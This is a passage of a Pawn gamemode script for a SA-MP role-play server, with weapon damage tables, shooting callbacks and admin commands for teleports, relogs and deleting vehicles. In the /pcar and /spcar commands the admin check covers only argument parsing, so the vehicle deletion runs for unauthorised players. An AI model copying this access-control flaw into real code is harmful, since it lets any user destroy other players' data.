                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 30:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-20); // Torso
                        case 4: SetPlayerHealth(playerid, HP-14); // Groin
                        case 5: SetPlayerHealth(playerid, HP-9); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-9); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-8); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-8); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-40); // Head
                    }
                }
                case 31:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-21); // Torso
                        case 4: SetPlayerHealth(playerid, HP-14); // Groin
                        case 5: SetPlayerHealth(playerid, HP-9); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-9); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-8); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-8); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-40); // Head
                    }
                }
                case 32:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-10); // Torso
                        case 4: SetPlayerHealth(playerid, HP-8); // Groin
                        case 5: SetPlayerHealth(playerid, HP-5); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-5); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-5); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-5); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-20); // Head
                    }
                }
                case 33:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-26); // Torso
                        case 4: SetPlayerHealth(playerid, HP-15); // Groin
                        case 5: SetPlayerHealth(playerid, HP-10); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-14); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-10); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-14); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-90); // Head
                    }
                }
                case 34:
                {
                    switch(bodypart)
                    {
                        case 3: SetPlayerHealth(playerid, HP-33); // Torso
                        case 4: SetPlayerHealth(playerid, HP-28); // Groin
                        case 5: SetPlayerHealth(playerid, HP-20); // Left ARM
                        case 6: SetPlayerHealth(playerid, HP-20); // Right ARM
                        case 7: SetPlayerHealth(playerid, HP-20); // Left Leg
                        case 8: SetPlayerHealth(playerid, HP-20); // Right Leg
                        case 9: SetPlayerHealth(playerid, HP-100); // Head
                    }
                }
            }
        }
    }
    return 1;
}
public OnPlayerShootPlayer(Shooter,Target,Float:HealthLost,Float:ArmourLost)
{
	new string[128];
	new Float:hp[MAX_PLAYERS];
	new Float:armor[MAX_PLAYERS];
	if(GetPlayerWeapon(Shooter) == 34 && Player[Shooter][pScope] && Hitman[Shooter] == Target)
	{
		SetPlayerHealth(Target, 0);
		if(Hitman[Shooter] == Target)
		{
		    format(string, sizeof(string), " You have been critically injured by a hitman and lost $%d, the contrat on your head was cleared.", Player[Target][pContract]/2);
		    SendClientMessage(Target, COLOR_YELLOW, string);
		    format(string, sizeof(string), "HitmanWarn: %s has fulfilled the contract on %s's head and collected $%d.", GetName(Shooter), GetName(Target), Player[Target][pContract]/2);
			SendHitmanMessage(COLOR_YELLOW, string);
			GiveZamoraMoney(Target, -Player[Target][pContract]/2);
			GiveZamoraMoney(Shooter, Player[Target][pContract]/2);
			Player[Target][pContract] = 0;
			format(Player[Target][pContract], 32, "");
			Hitman[Shooter] = -1;
			Player[Shooter][pCSuccess] ++;
		}
		Player[Shooter][pScope] --;
	}
	if(!IsACop(Shooter) || !IsDOC(Shooter) || !IsFBI(Shooter))
	{
	    if(Tazer[Shooter])
	    {
	        if(GetPlayerWeapon(Shooter) == 23)
	        {
	            if(!IsPlayerTazed(Target) && !IsPlayerCuffed(Target) && !IsPlayerTied(Target) && !IsDead[Target])
	            {
		            new Float:HP, Float:Armor;
		            GetPlayerHealth(Target, HP);
		            GetPlayerArmour(Target, Armor);
		            SetPlayerHealth(Target, HealthLost+HP);
		            SetPlayerArmour(Target, ArmourLost+Armor);
		            if(!IsPlayerNearPlayer(Shooter, Target, 35)) return SendClientMessage(Shooter, COLOR_GRAD2, "You are too far away from that player.");
					// Got Tazed
				    format(string, sizeof(string), "* %s aims his tazer on %s and tazes him.", GetName(Shooter), GetName(Target));
				    SendNearbyMessage(Shooter, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
                    GameTextForPlayer(Target, "~r~Tazed", 3500, 3);
					TogglePlayerControllable(Target, 0);
					// Tazed Detecting
					TogglePlayerTazed(Target, 1);
					// Tazer Timeout
					TazeTimeout[Target] = 21;
					TazeCountDown[Target] = SetTimerEx("TazeTimer", 1000, true, "d", Target);
				}
		    }
	    }
	  }
 if(GetPlayerWeapon(Shooter) == 24 && Player[Shooter][pSpecialWeapon] == 1) // deagle of extra damage
	{
		if(Player[Target][pArmor] > 0)
		{
		    if(Player[Target][pArmor] <= 0) SetPlayerArmour(Target, 0);
		    GetPlayerArmour(Target, Player[Target][pArmor]);
		    SetPlayerArmour(Target, Player[Target][pArmor] - 30);
		}
		if(Player[Target][pArmor] == 0)
		{
		    GetPlayerHealth(Target, Player[Target][pHealth]);
		    SetPlayerHealth(Target, Player[Target][pHealth] - 30);
		}
	}
	if(GetPlayerWeapon(Shooter) == 30 && Player[Shooter][pSpecialWeapon] == 2) // ak47 of health
	{
	    GetPlayerHealth(Shooter, hp[Shooter]);
	    if(hp[Shooter] >= 100)
		{
			SetPlayerHealth(Shooter, 100);
			return 1;
		}
    	SetPlayerHealth(Shooter, hp[Shooter] + 10);
	}
	if(GetPlayerWeapon(Shooter) == 31 && Player[Shooter][pSpecialWeapon] == 3) // m4 of armor
	{
	    GetPlayerArmour(Shooter, armor[Shooter]);
	    if(armor[Shooter] >= 100)
		{
			SetPlayerArmour(Shooter, 100);
			return 1;
		}
    	SetPlayerArmour(Shooter, armor[Shooter] + 10);
	}
	if(GetPlayerWeapon(Shooter) == 27 && Player[Shooter][pSpecialWeapon] == 4) // spas health armor
	{
	    GetPlayerHealth(Shooter, hp[Shooter]);
	    GetPlayerArmour(Shooter, armor[Shooter]);
		if(armor[Shooter] >= 100 && hp[Shooter] >= 100)
		{
		    SetPlayerArmour(Shooter, 100);
		    SetPlayerHealth(Shooter, 100);
		    return 1;
		}
		if(hp[Shooter] >= 100 && armor[Shooter] < 100)
		{
		    SetPlayerHealth(Shooter, 100);
		    SetPlayerArmour(Shooter, armor[Shooter]+10);
		    return 1;
		}
		if(hp[Shooter] < 100 && armor[Shooter] >= 100)
		{
		    SetPlayerHealth(Shooter, hp[Shooter]+10);
		    SetPlayerArmour(Shooter, 100);
		    return 1;
		}
		if(hp[Shooter] < 100 && armor[Shooter] < 100)
		{
			SetPlayerHealth(Shooter, hp[Shooter] + 10);
 			SetPlayerArmour(Shooter, armor[Shooter] + 10);
 			return 1;
		}
	}
	if(GetPlayerWeapon(Shooter) == 34 && Player[Shooter][pSpecialWeapon] == 5) // sniper death
	{
        SetPlayerHealth(Target, 0);
	}
	if(EventTeam[Shooter] == EventTeam[Target])
	{
        new Float:HP, Float:Armor;
        GetPlayerHealth(Target, HP);
        GetPlayerArmour(Target, Armor);
        SetPlayerHealth(Target, HealthLost+HP);
        SetPlayerArmour(Target, ArmourLost+Armor);
    }
	return 1;
}

public OnPlayerWeaponShot( playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ )
{
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);

        //Desync weapon IDs that don't fire bullets
        if (weaponid < 22 || weaponid > 38)
                return 0;

        //Desync shots with Z pos out of bounds
        if(!(-20000.0 <= z <= 20000.0))
                return 0;

        return 1;
}


//=========================================[OnPlayerCommandText]===================================================
//-----------------------------------------[ Administrators Commands] ----------------------------------------------

IRP:backashark(playerid, var[])
{
    if(Player[playerid][pAdmin] >= 3)
    {
	    new string[140];
	    new sharktime1 = MoveObject(Shark, 3225.66357, -1858.81152, 0.35000, 2.00); //Move the Ship (Object) to the next island
	    GameTextForPlayer(playerid,"~b~Shark is Moving!",2500, 3); //Normal Text in the middle of the screen
	    SendClientMessage(playerid, COLOR_RED, "Shark is getting back to it's original place!!"); //Sends the player a message
	    format(string, sizeof(string), "The shark will return back to it's original position in %d MilliSeconds", sharktime1);
	    SendClientMessage(playerid, 0xFFFF00AA, string);
    }
    else SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
}
IRP:moveashark(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 3)
    {
	    new string[120];
	    new sharktime = MoveObject(Shark, 3221.6042, -1901.5311, 0.3500, 2.00); //Move the Ship (Object) to the next island
	    GameTextForPlayer(playerid,"~b~Shark is Moving!",2500, 3); //Normal Text in the middle of the screen
	    SendClientMessage(playerid, COLOR_RED, "Shark in the water!!"); //Sends the player a message
	    format(string, sizeof(string), "The shark will finish swimming in %d MilliSeconds", sharktime);
	    SendClientMessage(playerid, 0xFFFF00AA, string);
    }
    else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
	return 1;
}
IRP:backaship(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 3)
    {
	    new string[120];
	    new shiptime1 = MoveObject(Ship, 3249.76074, -1915.40479, 14.25000, 5.00); //Move the Ship (Object) to the next island
	    MoveObject(Ship1, 3249.91553, -1915.26013, 14.06402, 5.00); //Move the second part of the Ship (Object) to the next island
	    GameTextForPlayer(playerid,"~b~Admin Ship Moving!",2500, 3); //Normal Text in the middle of the screen
	    SendClientMessage(playerid, COLOR_PURPLE, "Admin Ship moving to the next island!"); //Sends the player a message
	    format(string, sizeof(string), "The ship will arrive at the Main Island in %d MilliSeconds", shiptime1);
	    SendClientMessage(playerid, 0xFFFF00AA, string);
    }
    else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
	return 1;
}
//moveship should be added here lol!
IRP:enteraship(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 3)
   	{
    	if(!IsPlayerInRangeOfPoint(playerid, 15,3261.2825,-1909.4198,2.4781)) //Checks the player position
		{
  			SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the Admin Ship enter point!"); //Send the player a message if he is not near the Admin Gate
   			return 1;
		}
	    SetPlayerInterior(playerid, 0); //Set the player interior
	    SetPlayerPos(playerid, 3253.2810,-1904.9425,2.9609); //Set the player position
	    SetPlayerFacingAngle(playerid, 163.4059); //Set the player face angle
	    GameTextForPlayer(playerid,"~b~You have entered the ~r~Admin Ship!",2500, 3); //Normal Text in the middle of the screen
	    SendClientMessage(playerid, COLOR_PURPLE, "Welcome to the {E10000}Admin Ship!"); //Sends the player a message
	    StopAudioStreamForPlayer(playerid); // Stop the song for the player when he enter the admin ship (INCASE)
   }
   else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   return 1;
}
IRP:agodoff(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 3)
    {
        SetPlayerHealth(playerid, 100); //Set the player health to 100
        SetPlayerArmour(playerid, 100); //Set the player armor to 100
        GameTextForPlayer(playerid, "~y~God Mode Off!", 2500, 1); ////Normal Text in the right of the screen
        SendClientMessage(playerid, COLOR_RED,"You have succefully turned your God Mode Off!"); //Sends the player a message
    }
    else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
	return 1;
}
IRP:exitclub(playerid, var[])
{
	if(Player[playerid][pAdmin] >= 3)
    {
    	if(!IsPlayerInRangeOfPoint(playerid, 15,2019.0717,1017.9355,996.8750)) //Checks the player position
		{
  			SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the admin club exit point!"); //Send the player a message if he is not near the Admin Gate
	    	return 1;
		}
	    SetPlayerInterior(playerid, 0); //Set the player interior
	    SetPlayerPos(playerid, 3357.2056,-1794.0542,14.2500); //Set the player position
	    GameTextForPlayer(playerid,"~y~Goodbye!",2500, 3); //Normal Text in the middle of the screen
	    SendClientMessage(playerid, COLOR_PURPLE, "Don't forget to visit us again!"); //Sends the player a message
	    StopAudioStreamForPlayer(playerid); // Stop the song for the player when he exits the admin club
    }
   	else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   	return 1;
}
IRP:enterclub(playerid, var[])
{
   	if(Player[playerid][pAdmin] >= 3)
    {
    	if(!IsPlayerInRangeOfPoint(playerid, 15,3357.2056,-1794.0542,14.2500)) //Checks the player position
		{
	    	SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the admin club enter point!"); //Send the player a message if he is not near the Admin Gate
		    return 1;
		}
	    SetPlayerInterior(playerid, 10); //Set the player interior
	    SetPlayerPos(playerid, 2018.7491,1017.9331,996.8750); //Set the player position
	    GameTextForPlayer(playerid,"~b~Welcome To Admin Club",2500, 3); //Normal Text in the middle of the screen
	    SendClientMessage(playerid, COLOR_PURPLE, "Have fun!"); //Sends the player a message
	    AllowInteriorWeapons(1); //ALlow weapons inside the interiors
	    PlayAudioStreamForPlayer(playerid, "http://k002.kiwi6.com/hotlink/g6t0xi8t9w/j._cole_-_who_dat.mp3"); //Play a song when player enter the admin club
	}
 	else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
  	return 1;
}
IRP:aexit2(playerid, var[])
{
   if(Player[playerid][pAdmin] >= 3)
   {
    	if(!IsPlayerInRangeOfPoint(playerid, 15,3307.7366,-1778.4110,12.5991)) //Checks the player position
		{
  			SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the second exit point!"); //Send the player a message if he is not near the Admin Gate
	    	return 1;
		}
	    new veh = GetPlayerVehicleID(playerid); //Checks the vehicle id
	    SetPlayerPos(playerid, 3303.5818,-1776.8317,12.8457); //Set player position
	    SetPlayerFacingAngle(playerid, 70.6931); //Set player facing angle (Direction)
	    GameTextForPlayer(playerid,"~y~~Goodbye!",2000, 3); //Normal Text in the middle of the screen
	    SetPlayerInterior(playerid, 0); //Set player interior to 0 to avoid getting bugged
	    SetPlayerVirtualWorld(playerid, 0); //Set player world to 0 to avoid getting bugged
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
	    SetVehiclePos(veh, 3296.2427,-1774.5289,12.7894); //Set vehicle position
	    SetVehicleZAngle(veh, 0.0); //Set vehicle angle (Direction)
	    LinkVehicleToInterior(veh, 0); //Set vehicle interior
	    SetVehicleVirtualWorld(veh, 0); //Set vehicle world to avoid getting bugged
	    PutPlayerInVehicle(playerid, veh, 0); //Put the player inside the vehicle
	    GameTextForPlayer(playerid,"~g~Goodbye!",2000, 3); //Normal Text in the middle of the screen
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
   }
   else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   return 1;
}
IRP:aexit(playerid, var[])
{
   	if(Player[playerid][pAdmin] >= 3)
    {
    	if(!IsPlayerInRangeOfPoint(playerid, 15,2907.5215,-1649.2078,13.0280)) //Checks the player position
		{
  			SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the exit point!"); //Send the player a message if he is not near the Admin Gate
	    	return 1;
		}
	    new veh = GetPlayerVehicleID(playerid); //Checks the vehicle id
	    SetPlayerPos(playerid, 2894.4553,-1645.6383,11.0469); //Set player position
	    SetPlayerFacingAngle(playerid, 342.7331); //Set player facing angle (Direction)
	    GameTextForPlayer(playerid,"~y~~Goodbye!",2000, 3); //Normal Text in the middle of the screen
	    SetPlayerInterior(playerid, 0); //Set player interior to 0 to avoid getting bugged
	    SetPlayerVirtualWorld(playerid, 0); //Set player world to 0 to avoid getting bugged
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
	    SetVehiclePos(veh, 2894.4553,-1645.6383,11.0469); //Set vehicle position
	    SetVehicleZAngle(veh, 0.0); //Set vehicle angle (Direction)
	    LinkVehicleToInterior(veh, 0); //Set vehicle interior
	    SetVehicleVirtualWorld(veh, 0); //Set vehicle world to avoid getting bugged
	    PutPlayerInVehicle(playerid, veh, 0); //Put the player inside the vehicle
	    GameTextForPlayer(playerid,"~g~Goodbye!",2000, 3); //Normal Text in the middle of the screen
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
   }
   else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   return 1;
}
IRP:aenter2(playerid, var[])
{
   	if(Player[playerid][pAdmin] >= 3)
    {
    	if(!IsPlayerInRangeOfPoint(playerid, 15,3303.5818,-1776.8317,12.8457)) //Checks the player position
		{
  			SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the second enter point!"); //Send the player a message if he is not near the Admin Gate
	    	return 1;
		}
	    new veh = GetPlayerVehicleID(playerid); //Checks the vehicle id
	    SetPlayerPos(playerid, 3305.3635,-1777.1813,12.8864); //Set player position
	    SetPlayerFacingAngle(playerid, 342.7331); //Set player facing angle (Direction)
	    GameTextForPlayer(playerid,"~r~~You have entered the Admin Island!",2000, 3); //Normal Text in the middle of the screen
	    SetPlayerInterior(playerid, 0); //Set player interior to 0 to avoid getting bugged
	    SetPlayerVirtualWorld(playerid, 0); //Set player world to 0 to avoid getting bugged
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
	    SetVehiclePos(veh, 3314.2671,-1779.9308,12.4954); //Set vehicle position
	    SetVehicleZAngle(veh, 253.9931); //Set vehicle angle (Direction)
	    LinkVehicleToInterior(veh, 0); //Set vehicle interior
	    SetVehicleVirtualWorld(veh, 0); //Set vehicle world to avoid getting bugged
	    PutPlayerInVehicle(playerid, veh, 0); //Put the player inside the vehicle
	    GameTextForPlayer(playerid,"~r~You have entered the Admin Island!",2000, 3); //Normal Text in the middle of the screen
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
   }
   else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   return 1;
}
IRP:aenter(playerid, var[])
{
   	if(Player[playerid][pAdmin] >= 3)
    {
	    if(!IsPlayerInRangeOfPoint(playerid, 15,2906.0601,-1648.6394,13.0189)) //Checks the player position
		{
	 		SendClientMessage(playerid, COLOR_RED, "[ERROR]: You are not near the enter point!"); //Send the player a message if he is not near the Admin Gate
	   		return 1;
		}
	    new veh = GetPlayerVehicleID(playerid); //Checks the vehicle id
	    SetPlayerPos(playerid, 2907.5215,-1649.2078,13.0280); //Set player position
	    SetPlayerFacingAngle(playerid, 342.7331); //Set player facing angle (Direction)
	    GameTextForPlayer(playerid,"~r~~You have entered the Admin Island!",2000, 3); //Normal Text in the middle of the screen
	    SetPlayerInterior(playerid, 0); //Set player interior to 0 to avoid getting bugged
	    SetPlayerVirtualWorld(playerid, 0); //Set player world to 0 to avoid getting bugged
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
	    SetVehiclePos(veh, 2916.4922,-1652.2341,12.5413); //Set vehicle position
	    SetVehicleZAngle(veh, 253.9931); //Set vehicle angle (Direction)
	    LinkVehicleToInterior(veh, 0); //Set vehicle interior
	    SetVehicleVirtualWorld(veh, 0); //Set vehicle world to avoid getting bugged
	    PutPlayerInVehicle(playerid, veh, 0); //Put the player inside the vehicle
	    GameTextForPlayer(playerid,"~r~You have entered the Admin Island!",2000, 3); //Normal Text in the middle of the screen
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
   }
   else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   return 1;
}
IRP:gotoisland(playerid, var[])
{
   if(Player[playerid][pAdmin] >= 3)
   {
	    new veh = GetPlayerVehicleID(playerid); //Checks the vehicle id
	    SetPlayerPos(playerid, 2865.2854,-1660.0159,10.8750); //Set player position
	    SetPlayerFacingAngle(playerid, 342.7331); //Set player facing angle (Direction)
	    GameTextForPlayer(playerid,"~g~Welcome To Admin Island!",2000, 3); //Normal Text in the middle of the screen
	    SetPlayerInterior(playerid, 0); //Set player interior to 0 to avoid getting bugged
	    SetPlayerVirtualWorld(playerid, 0); //Set player world to 0 to avoid getting bugged
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
	    SetVehiclePos(veh, 2865.2854,-1660.0159,10.8750); //Set vehicle position
	    SetVehicleZAngle(veh, 253.9931); //Set vehicle angle (Direction)
	    LinkVehicleToInterior(veh, 0); //Set vehicle interior
	    SetVehicleVirtualWorld(veh, 0); //Set vehicle world to avoid getting bugged
	    PutPlayerInVehicle(playerid, veh, 0); //Put the player inside the vehicle
	    GameTextForPlayer(playerid,"~g~Welcome To The Admin Island!",2000, 3); //Normal Text in the middle of the screen
	    TogglePlayerControllable(playerid, 1); //Set player control (Unfreeze)
   }
   else return SendClientMessage(playerid, COLOR_GREY,"You are not authorized to use that command");
   return 1;
}
IRP:relog(playerid, var[])
{
    new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3 || Player[playerid][pStaffObserver])
	{
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /relog [playerid]");
	    if(!Logged(user)) return NoLoginB(playerid);
    	isRelogging[user] = true;
    	GetPlayerIp(user, relogPlayerIP[user], 17);
    	format(string, sizeof(string), "banip %s", relogPlayerIP[user]);
    	SendRconCommand(string);
    	SendClientMessage(user, COLOR_LIGHTRED, "You've been forced to relog by an administrator");
    	SendClientMessage(user, COLOR_WHITE, "Reconnecting...");
    	format(string, sizeof(string), "* %s has left the server. (Relog)", GetName(user));
    	SendNearbyMessage(playerid, 10, string, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
    	return 1;
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:pcar(playerid, var[])
{
    new user, string[128], string1[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
 	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /spcar [playerid] [1-4]");
    	if(!IsPlayerConnected(user)) return NoLoginB(playerid);
    }
	if(!strcmp(var, "1", true))
	{
		DestroyVehicle(Player[user][pVeh]);
		Player[user][pVeh] = 0;
	    Player[user][vModel] = 0;
		Player[user][vX] = 0;
		Player[user][vY] = 0;
		Player[user][vZ] = 0;
		Player[user][vA] = 0;
		Player[user][vC1] = 0;
		Player[user][vC2] = 0;
        format(string, sizeof(string), "Your first vehicle was deleted by %s", GetName(playerid));
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "%s's first vehicle was deleted by %s", GetName(user), GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN, string1);
	}
	if(!strcmp(var, "2", true))
	{
		DestroyVehicle(Player[user][pVVeh]);
		Player[user][pVVeh] = 0;
	    Player[user][vVModel] = 0;
		Player[user][vVX] = 0;
		Player[user][vVY] = 0;
		Player[user][vVZ] = 0;
		Player[user][vVA] = 0;
		Player[user][vVC1] = 0;
		Player[user][vVC2] = 0;
        format(string, sizeof(string), "Your second vehicle was deleted by %s", GetName(playerid));
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "%s's second vehicle was deleted by %s", GetName(user), GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN, string1);
	}
	if(!strcmp(var, "3", true))
	{
		DestroyVehicle(Player[user][pVVVeh]);
		Player[user][pVVVeh] = 0;
	    Player[user][vVVModel] = 0;
		Player[user][vVVX] = 0;
		Player[user][vVVY] = 0;
		Player[user][vVVZ] = 0;
		Player[user][vVVA] = 0;
		Player[user][vVVC1] = 0;
		Player[user][vVVC2] = 0;
        format(string, sizeof(string), "Your third vehicle was deleted by %s", GetName(playerid));
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "%s's third vehicle was deleted by %s", GetName(user), GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN, string1);
	}
	if(!strcmp(var, "4", true))
	{
		DestroyVehicle(Player[user][pVVVVeh]);
		Player[user][pVVVVeh] = 0;
	    Player[user][vVVVModel] = 0;
		Player[user][vVVVX] = 0;
		Player[user][vVVVY] = 0;
		Player[user][vVVVZ] = 0;
		Player[user][vVVVA] = 0;
		Player[user][vVVVC1] = 0;
		Player[user][vVVVC2] = 0;
        format(string, sizeof(string), "Your fourth vehicle was deleted by %s", GetName(playerid));
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "%s's fourth vehicle was deleted by %s", GetName(user), GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN, string1);
	}
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:spcar(playerid, var[])
{
    new user, string[128], string1[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pStaffObserver])
 	{
    	if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /spcar [playerid] [1-4]");
    	if(!IsPlayerConnected(user)) return NoLoginB(playerid);
    }
	if(!strcmp(var, "1", true))
	{
		DestroyVehicle(Player[user][pVeh]);
		Player[user][pVeh] = 0;
	    Player[user][vModel] = 0;
		Player[user][vX] = 0;
		Player[user][vY] = 0;
		Player[user][vZ] = 0;
		Player[user][vA] = 0;
		Player[user][vC1] = 0;
		Player[user][vC2] = 0;
        format(string, sizeof(string), "Your first vehicle was deleted by %s", Player[playerid][pSName]);
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "StaffWarning: %s's first vehicle was deleted by %s", GetName(user), GetName(playerid));
    	StaffWarn(COLOR_SWARN, string1);
	}
	if(!strcmp(var, "2", true))
	{
		DestroyVehicle(Player[user][pVVeh]);
		Player[user][pVVeh] = 0;
	    Player[user][vVModel] = 0;
		Player[user][vVX] = 0;
		Player[user][vVY] = 0;
		Player[user][vVZ] = 0;
		Player[user][vVA] = 0;
		Player[user][vVC1] = 0;
		Player[user][vVC2] = 0;
        format(string, sizeof(string), "Your second vehicle was deleted by %s", Player[playerid][pSName]);
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "StaffWarning: %s's second vehicle was deleted by %s", GetName(user), GetName(playerid));
    	StaffWarn(COLOR_SWARN, string1);
	}
	if(!strcmp(var, "3", true))
	{
		DestroyVehicle(Player[user][pVVVeh]);
		Player[user][pVVVeh] = 0;
	    Player[user][vVVModel] = 0;
		Player[user][vVVX] = 0;
		Player[user][vVVY] = 0;
		Player[user][vVVZ] = 0;
		Player[user][vVVA] = 0;
		Player[user][vVVC1] = 0;
		Player[user][vVVC2] = 0;
        format(string, sizeof(string), "Your third vehicle was deleted by %s", Player[playerid][pSName]);
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "StaffWarning: %s's third vehicle was deleted by %s", GetName(user), GetName(playerid));
    	StaffWarn(COLOR_SWARN, string1);
	}
	if(!strcmp(var, "4", true))
	{
		DestroyVehicle(Player[user][pVVVVeh]);
		Player[user][pVVVVeh] = 0;
	    Player[user][vVVVModel] = 0;
		Player[user][vVVVX] = 0;
		Player[user][vVVVY] = 0;
		Player[user][vVVVZ] = 0;
		Player[user][vVVVA] = 0;
		Player[user][vVVVC1] = 0;
		Player[user][vVVVC2] = 0;
        format(string, sizeof(string), "Your fourth vehicle was deleted by %s", Player[playerid][pSName]);
    	SendClientMessage(user,COLOR_ADMWARN, string);
    	format(string1, sizeof(string1), "StaffWarning: %s's fourth vehicle was deleted by %s", GetName(user), GetName(playerid));
    	StaffWarn(COLOR_SWARN, string1);
	}
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:mole(playerid, var[])
{
	new string[128],log[128], mole, sms, say, day, dayz, days[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
    	if(sscanf(var,"d", mole))
    	{
    	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /mole [action]");
    	    SendClientMessage(playerid, COLOR_GRAD2, "** (1) sms | (2) say | (3) createday");
    	    return 1;
    	}
    	if(mole < 0 || mole > 3) return 0;
    	switch(mole)
    	{
        	case 1:
    		{
    			if(sscanf(var, "ds[64]", mole, sms)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /mole [sms] [text]");
             	foreach(Player, i)
    	    	{
	        	    if(Logged(i))
	           	    {
		               format(string, sizeof(string), "SMS: %s, Sender: MOLE (555)", sms);
	        	       SendClientMessage(i, COLOR_YELLOW, string);
	                }
        		}
        		format(log, sizeof(log), "[%s]: %s", GetName(playerid), sms);
        		Log("Log/Admins/molesms.log", log);
        	}
        	case 2:
    		{
    			if(sscanf(var, "ds[128]", mole, say)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /mole [say] [text]");
             	foreach(Player, i)
    	    	{
	        	    if(Logged(i))
	           	    {
		               format(string, sizeof(string), "MOLE: %s", say);
	        	       SendClientMessage(i, COLOR_VIP, string);
	                }
        		}
        		format(log, sizeof(log), "[%s]: %s", GetName(playerid), say);
        		Log("Log/Admins/molesay.log", log);
        	}
        	case 3:
    		{
    			if(sscanf(var, "dii", mole, day, dayz))
				{
		    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /mole [createday] [3] [daynumber]");
    		     	SendClientMessage(playerid, 0x5FB404FF, "** [GOOD DAYS]: {FFFFFF}1) Day of World Wide Economics | 2)Day Of Liberty | 6) Day Of Unstoppable");
